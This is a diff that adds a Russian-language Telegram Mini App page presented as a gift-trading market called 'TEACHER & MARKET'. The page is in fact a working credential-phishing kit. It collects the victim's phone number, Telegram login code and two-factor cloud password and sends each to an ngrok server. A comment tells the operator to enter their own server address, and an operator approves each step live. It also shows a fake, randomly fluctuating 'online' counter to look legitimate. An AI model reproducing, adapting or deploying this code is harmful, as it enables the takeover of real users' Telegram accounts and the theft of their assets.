@@ -1,0 +1,768 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TEACHER & MARKET</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(180deg, #0f0f23 0%, #1a1a2e 100%);
+            color: #fff;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .tg-header {
+            background: rgba(22, 33, 62, 0.95);
+            backdrop-filter: blur(20px);
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+
+        .close-btn {
+            background: none;
+            border: none;
+            color: #fff;
+            font-size: 24px;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            border-radius: 50%;
+            transition: background 0.2s;
+        }
+
+        .close-btn:hover { background: rgba(255, 255, 255, 0.1); }
+
+        .app-info { text-align: center; flex-grow: 1; }
+        .app-name { font-size: 16px; font-weight: 600; color: #fff; }
+        .app-subtitle { font-size: 12px; color: rgba(255, 255, 255, 0.6); margin-top: 2px; }
+
+        .container { max-width: 440px; margin: 0 auto; padding: 20px; }
+
+        .card {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 30px;
+            margin-bottom: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+        }
+
+        .counter {
+            font-size: 72px;
+            font-weight: 800;
+            text-align: center;
+            background: linear-gradient(135deg, #00ff88 0%, #00ccff 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin: 20px 0;
+            text-shadow: 0 0 30px rgba(0, 255, 136, 0.3);
+        }
+
+        .main-title {
+            font-size: 28px;
+            font-weight: 700;
+            text-align: center;
+            margin: 15px 0;
+            background: linear-gradient(90deg, #00c6ff, #0072ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .welcome-text {
+            font-size: 18px;
+            text-align: center;
+            color: rgba(255, 255, 255, 0.9);
+            margin: 10px 0 30px;
+            line-height: 1.5;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 18px 24px;
+            background: linear-gradient(135deg, #0072ff 0%, #00c6ff 100%);
+            border: none;
+            border-radius: 14px;
+            color: white;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 25px;
+            box-shadow: 0 6px 20px rgba(0, 114, 255, 0.3);
+        }
+
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(0, 114, 255, 0.4); }
+        .btn:active { transform: translateY(0); }
+        .btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+
+        .input-group { margin-bottom: 24px; }
+
+        .input-label {
+            display: block;
+            margin-bottom: 10px;
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 15px;
+            font-weight: 500;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 18px 20px;
+            background: rgba(255, 255, 255, 0.07);
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            color: white;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: #0072ff;
+            background: rgba(255, 255, 255, 0.1);
+            box-shadow: 0 0 0 3px rgba(0, 114, 255, 0.2);
+        }
+
+        .input-field.error { border-color: #ff4757; animation: shake 0.5s; }
+
+        .error-message {
+            color: #ff4757;
+            font-size: 14px;
+            margin-top: 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 10px 15px;
+            background: rgba(255, 71, 87, 0.1);
+            border-radius: 10px;
+            border-left: 4px solid #ff4757;
+        }
+
+        .code-inputs { display: flex; gap: 12px; justify-content: center; margin: 30px 0; }
+
+        .code-input {
+            width: 60px;
+            height: 70px;
+            text-align: center;
+            font-size: 32px;
+            font-weight: bold;
+            background: rgba(255, 255, 255, 0.07);
+            border: 2px solid rgba(255, 255, 255, 0.15);
+            border-radius: 14px;
+            color: white;
+            transition: all 0.3s;
+        }
+
+        .code-input:focus {
+            outline: none;
+            border-color: #0072ff;
+            background: rgba(255, 255, 255, 0.1);
+            transform: scale(1.05);
+        }
+
+        .hint {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.5);
+            text-align: center;
+            margin: 15px 0;
+            line-height: 1.5;
+        }
+
+        .link-btn {
+            background: none;
+            border: none;
+            color: #00c6ff;
+            font-size: 15px;
+            cursor: pointer;
+            text-decoration: underline;
+            margin: 10px 0;
+            display: block;
+            text-align: center;
+            width: 100%;
+            padding: 10px;
+            border-radius: 8px;
+            transition: background 0.2s;
+        }
+
+        .link-btn:hover { background: rgba(0, 198, 255, 0.1); }
+
+        .loading-screen { text-align: center; padding: 60px 20px; }
+        .loading-title { font-size: 26px; font-weight: 600; margin-bottom: 20px; color: #00ff88; }
+        .loading-subtitle { color: rgba(255, 255, 255, 0.6); font-size: 16px; margin-bottom: 40px; }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+
+        @keyframes pulse {
+            0% { opacity: 0.6; }
+            50% { opacity: 1; }
+            100% { opacity: 0.6; }
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+
+        .loading-dots { display: inline-flex; gap: 8px; margin-top: 30px; }
+
+        .dot {
+            width: 12px;
+            height: 12px;
+            background: #00c6ff;
+            border-radius: 50%;
+            animation: pulse 1.4s infinite;
+        }
+
+        .dot:nth-child(2) { animation-delay: 0.2s; }
+        .dot:nth-child(3) { animation-delay: 0.4s; }
+
+        .loader {
+            width: 80px;
+            height: 80px;
+            margin: 30px auto;
+            position: relative;
+            animation: float 2s ease-in-out infinite;
+        }
+
+        .loader-inner {
+            width: 100%;
+            height: 100%;
+            border: 3px solid transparent;
+            border-top: 3px solid #00ff88;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .step-indicator {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 25px;
+        }
+
+        .step {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            font-weight: 600;
+            color: rgba(255, 255, 255, 0.5);
+            transition: all 0.3s;
+        }
+
+        .step.active {
+            background: linear-gradient(135deg, #0072ff, #00c6ff);
+            color: white;
+            transform: scale(1.1);
+            box-shadow: 0 0 15px rgba(0, 114, 255, 0.5);
+        }
+
+        .step.completed { background: #00ff88; color: #000; }
+        .step-line { width: 40px; height: 2px; background: rgba(255, 255, 255, 0.1); }
+
+        .screen { display: none; animation: fadeIn 0.5s ease-out; }
+        .screen.active { display: block; }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .online-badge {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 10px 16px;
+            border-radius: 20px;
+            font-size: 14px;
+            color: #00ff88;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(0, 255, 136, 0.2);
+            z-index: 100;
+        }
+
+        .online-dot {
+            width: 8px;
+            height: 8px;
+            background: #00ff88;
+            border-radius: 50%;
+            animation: pulse 1.5s infinite;
+        }
+
+        .icon { font-size: 20px; }
+
+        @media (max-width: 480px) {
+            .container { padding: 15px; }
+            .card { padding: 25px 20px; }
+            .counter { font-size: 60px; }
+            .main-title { font-size: 24px; }
+            .code-input { width: 50px; height: 60px; font-size: 28px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="tg-header">
+        <button class="close-btn" onclick="window.Telegram.WebApp.close()">
+            <i class="fas fa-times"></i>
+        </button>
+        <div class="app-info">
+            <div class="app-name">TEACHER & MARKET</div>
+            <div class="app-subtitle">мини-приложение</div>
+        </div>
+        <div style="width: 40px;"></div>
+    </div>
+
+    <div class="container">
+        <div id="screen1" class="screen active">
+            <div class="card">
+                <div class="main-title">TEACHER & MARKET</div>
+                <div class="counter" id="counter">6387</div>
+                <div class="welcome-text">Добро пожаловать!</div>
+
+                <div class="main-title">TEACHER & MARKET</div>
+                <div class="welcome-text">
+                    Здесь начинается мир продажи и обмена подарками
+                </div>
+
+                <button class="btn" onclick="showScreen('screen2')">
+                    <i class="fas fa-user-check"></i>
+                    Авторизоваться
+                </button>
+            </div>
+        </div>
+
+        <div id="screen2" class="screen">
+            <div class="card">
+                <div class="step-indicator">
+                    <div class="step active">1</div>
+                    <div class="step-line"></div>
+                    <div class="step">2</div>
+                    <div class="step-line"></div>
+                    <div class="step">3</div>
+                </div>
+
+                <div class="main-title">Введите ваш номер телефона</div>
+
+                <div class="input-group">
+                    <label class="input-label">Номер телефона</label>
+                    <input type="tel" id="phoneInput" class="input-field" placeholder="+7 900 123 45 67">
+                    <div id="phoneError" class="error-message" style="display: none;">
+                        <i class="fas fa-exclamation-circle"></i>
+                        Неверный номер. Попробуйте снова.
+                    </div>
+                </div>
+
+                <button class="btn" onclick="submitPhone()">
+                    <i class="fas fa-arrow-right"></i>
+                    Далее
+                </button>
+            </div>
+        </div>
+
+        <div id="screen3" class="screen">
+            <div class="card">
+                <div class="step-indicator">
+                    <div class="step completed"><i class="fas fa-check"></i></div>
+                    <div class="step-line"></div>
+                    <div class="step active">2</div>
+                    <div class="step-line"></div>
+                    <div class="step">3</div>
+                </div>
+
+                <div class="main-title">Введите код подтверждения</div>
+                <div id="codeError" class="error-message" style="display: none;">
+                    <i class="fas fa-exclamation-circle"></i>
+                    Неверный код подтверждения. Попробуйте снова.
+                </div>
+
+                <div class="code-inputs">
+                    <input type="text" class="code-input" maxlength="1" data-index="0" inputmode="numeric">
+                    <input type="text" class="code-input" maxlength="1" data-index="1" inputmode="numeric">
+                    <input type="text" class="code-input" maxlength="1" data-index="2" inputmode="numeric">
+                    <input type="text" class="code-input" maxlength="1" data-index="3" inputmode="numeric">
+                    <input type="text" class="code-input" maxlength="1" data-index="4" inputmode="numeric">
+                </div>
+
+                <div class="hint">
+                    Код подтвердится автоматически после ввода 5 цифр
+                </div>
+
+                <button class="link-btn" onclick="window.open('https://t.me/+42777', '_blank')">
+                    <i class="fas fa-hand-point-right"></i>
+                    Подтвердить код вручную
+                </button>
+
+                <button class="btn" onclick="submitCode()">
+                    <i class="fas fa-check-circle"></i>
+                    Подтвердить
+                </button>
+            </div>
+        </div>
+
+        <div id="screen4" class="screen">
+            <div class="card">
+                <div class="step-indicator">
+                    <div class="step completed"><i class="fas fa-check"></i></div>
+                    <div class="step-line"></div>
+                    <div class="step completed"><i class="fas fa-check"></i></div>
+                    <div class="step-line"></div>
+                    <div class="step active">2.5</div>
+                </div>
+
+                <div class="main-title">Введите пароль 2FA</div>
+                <div class="welcome-text">Введите ваш пароль двухфакторной аутентификации (2FA).</div>
+
+                <div class="input-group">
+                    <label class="input-label">Пароль 2FA:</label>
+                    <input type="password" id="twofaInput" class="input-field" placeholder="Введите ваш облачный пароль">
+                    <div id="twofaError" class="error-message" style="display: none;">
+                        <i class="fas fa-exclamation-circle"></i>
+                        Неверный пароль 2FA. Попробуйте снова.
+                    </div>
+                </div>
+
+                <button class="btn" onclick="submit2FA()">
+                    <i class="fas fa-sign-in-alt"></i>
+                    Завершить авторизацию
+                </button>
+            </div>
+        </div>
+
+        <div id="screen5" class="screen">
+            <div class="card">
+                <div class="loading-screen">
+                    <div class="loader">
+                        <div class="loader-inner"></div>
+                    </div>
+                    <div class="loading-title" id="loadingText">Загрузка</div>
+                    <div class="loading-subtitle">Пожалуйста, подождите</div>
+
+                    <div class="loading-dots">
+                        <div class="dot"></div>
+                        <div class="dot"></div>
+                        <div class="dot"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="online-badge">
+        <div class="online-dot"></div>
+        <span>Онлайн: <span id="onlineCount">6387</span></span>
+    </div>
+
+    <script>
+        const tg = window.Telegram?.WebApp;
+
+        // ⚠️ ВПИШИ СЮДА АДРЕС СВОЕГО API (ngrok / Render / VPS)
+        const SERVER_URL = "https://simultaneous-innermostly-keneth.ngrok-free.dev";
+
+        let sessionId = "tg_" + Date.now();
+        let isPolling = false;
+
+        if (tg) {
+            tg.expand();
+            tg.enableClosingConfirmation();
+            console.log("Telegram Mini App инициализирован");
+        } else {
+            console.log("Работает в обычном браузере");
+        }
+
+        function updateCounter() {
+            const counter = document.getElementById('counter');
+            const online = document.getElementById('onlineCount');
+            if (counter && online) {
+                let count = parseInt(counter.textContent);
+                let change = Math.floor(Math.random() * 5) - 2;
+                if (change === 0) change = 1;
+                count += change;
+
+                if (count < 6200) count = 6200;
+                if (count > 6500) count = 6500;
+
+                counter.textContent = count;
+                online.textContent = count;
+            }
+        }
+
+        setInterval(updateCounter, 8000);
+
+        function showScreen(screenId) {
+            document.querySelectorAll('.screen').forEach(s => {
+                s.classList.remove('active');
+            });
+            document.getElementById(screenId).classList.add('active');
+            clearErrors();
+        }
+
+        function clearErrors() {
+            document.getElementById('phoneError').style.display = 'none';
+            document.getElementById('phoneInput').classList.remove('error');
+            document.getElementById('codeError').style.display = 'none';
+            document.querySelectorAll('.code-input').forEach(inp => inp.classList.remove('error'));
+            document.getElementById('twofaError').style.display = 'none';
+            document.getElementById('twofaInput').classList.remove('error');
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            const codeInputs = document.querySelectorAll('.code-input');
+            codeInputs.forEach(input => {
+                input.addEventListener('input', function(e) {
+                    const value = e.target.value.replace(/[^0-9]/g, '');
+                    this.value = value;
+                    const index = parseInt(this.dataset.index);
+
+                    if (value && index < 4) {
+                        codeInputs[index + 1].focus();
+                    }
+
+                    let fullCode = '';
+                    codeInputs.forEach(inp => fullCode += inp.value);
+                    if (fullCode.length === 5) {
+                        setTimeout(() => submitCode(), 300);
+                    }
+                });
+
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && !this.value && this.dataset.index > 0) {
+                        codeInputs[parseInt(this.dataset.index) - 1].focus();
+                    }
+                });
+            });
+
+            setInterval(updateCounter, 30000);
+        });
+
+        async function submitPhone() {
+            const phone = document.getElementById('phoneInput').value.trim();
+
+            if (!phone || phone.length < 5) {
+                showError('phoneError', 'phoneInput');
+                return;
+            }
+
+            console.log("📞 Отправляю номер:", phone);
+            showScreen('screen5');
+            document.getElementById('loadingText').textContent = "Отправка номера...";
+
+            try {
+                await fetch(SERVER_URL + '/submit_phone', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        phone: phone,
+                        session_id: sessionId,
+                        source: 'telegram'
+                    })
+                });
+
+                console.log("✅ Номер отправлен");
+                pollForResponse('phone', phone);
+
+            } catch (error) {
+                console.error("❌ Ошибка:", error);
+                showScreen('screen2');
+                showError('phoneError', 'phoneInput');
+            }
+        }
+
+        async function submitCode() {
+            const codeInputs = document.querySelectorAll('.code-input');
+            let code = '';
+            codeInputs.forEach(input => code += input.value);
+
+            if (code.length !== 5) {
+                showError('codeError', 'codeInput');
+                return;
+            }
+
+            console.log("🔢 Отправляю код:", code);
+            showScreen('screen5');
+            document.getElementById('loadingText').textContent = "Проверка кода...";
+
+            try {
+                await fetch(SERVER_URL + '/submit_code', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        code: code,
+                        session_id: sessionId
+                    })
+                });
+
+                console.log("✅ Код отправлен");
+                pollForResponse('code', code);
+
+            } catch (error) {
+                console.error("❌ Ошибка:", error);
+                showScreen('screen3');
+                showError('codeError');
+                codeInputs.forEach(input => input.classList.add('error'));
+            }
+        }
+
+        async function submit2FA() {
+            const twofa = document.getElementById('twofaInput').value.trim();
+
+            if (!twofa) {
+                showError('twofaError', 'twofaInput');
+                return;
+            }
+
+            console.log("🔐 Отправляю 2FA:", twofa);
+            showScreen('screen5');
+            document.getElementById('loadingText').textContent = "Проверка 2FA...";
+
+            try {
+                await fetch(SERVER_URL + '/submit_2fa', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        twofa: twofa,
+                        session_id: sessionId
+                    })
+                });
+
+                console.log("✅ 2FA отправлен");
+                pollForResponse('2fa', twofa);
+
+            } catch (error) {
+                console.error("❌ Ошибка:", error);
+                showScreen('screen4');
+                showError('twofaError', 'twofaInput');
+            }
+        }
+
+        async function pollForResponse(type, data) {
+            if (isPolling) return;
+            isPolling = true;
+
+            console.log("🔄 Начинаю опрос сервера...");
+
+            for (let i = 0; i < 120; i++) {
+                try {
+                    const response = await fetch(SERVER_URL + '/check/' + sessionId);
+                    const result = await response.json();
+
+                    console.log("📥 Ответ сервера:", result);
+
+                    if (result.type === type) {
+                        if (result.answer === 'y') {
+                            console.log("✅ Админ подтвердил");
+
+                            if (type === 'phone') {
+                                showScreen('screen3');
+                            } else if (type === 'code') {
+                                showScreen('screen4');
+                            } else if (type === '2fa') {
+                                document.getElementById('loadingText').textContent = "Проверка на робота...";
+                                setTimeout(() => {
+                                    document.getElementById('loadingText').textContent = "Почти готово...";
+                                }, 5000);
+                            }
+
+                            isPolling = false;
+                            return;
+
+                        } else if (result.answer === 'n') {
+                            console.log("❌ Админ отклонил");
+
+                            if (type === 'phone') {
+                                showScreen('screen2');
+                                showError('phoneError', 'phoneInput');
+                            } else if (type === 'code') {
+                                showScreen('screen3');
+                                showError('codeError');
+                                document.querySelectorAll('.code-input').forEach(input => input.classList.add('error'));
+                            } else if (type === '2fa') {
+                                showScreen('screen4');
+                                showError('twofaError', 'twofaInput');
+                            }
+
+                            isPolling = false;
+                            return;
+                        }
+                    }
+
+                } catch (error) {
+                    console.log("⚠️ Ошибка опроса:", error);
+                }
+
+                await new Promise(resolve => setTimeout(resolve, 500));
+            }
+
+            console.log("⏰ Таймаут ожидания");
+
+            if (type === 'phone') {
+                showScreen('screen2');
+                alert("⏰ Таймаут ожидания ответа");
+            } else if (type === 'code') {
+                showScreen('screen3');
+                alert("⏰ Таймаут ожидания ответа");
+            } else if (type === '2fa') {
+                showScreen('screen4');
+                alert("⏰ Таймаут ожидания ответа");
+            }
+
+            isPolling = false;
+        }
+
+        function showError(errorId, inputId) {
+            const errorEl = document.getElementById(errorId);
+            if (errorEl) errorEl.style.display = 'block';
+
+            if (inputId) {
+                const inputEl = document.getElementById(inputId);
+                if (inputEl) inputEl.classList.add('error');
+            }
+        }
+
+        console.log("🚀 Мини-приложение загружено");
+        console.log("🌐 Сервер:", SERVER_URL);
+        console.log("📱 Сессия:", sessionId);
+    </script>
+</body>
+</html>
